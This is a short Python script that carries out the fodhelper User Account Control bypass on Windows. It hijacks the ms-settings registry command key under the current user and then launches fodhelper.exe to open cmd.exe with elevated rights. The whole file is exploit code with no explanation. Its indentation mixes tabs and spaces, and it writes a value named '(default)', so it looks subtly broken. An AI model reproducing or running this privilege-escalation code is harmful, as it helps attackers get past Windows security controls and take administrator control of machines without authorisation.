import winreg, os

def main():
	bypass(r"C:\Windows\System32\cmd.exe")
	print("Done.")

def set_reg(name, value):
	REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
    	print("Error")
        return False

def bypass(cmd):
	set_reg("DelegateExecute", "")
	set_reg("(default)", cmd)
	os.system(r"C:\Windows\System32\fodhelper.exe")


if __name__ == "__main__":
    main()
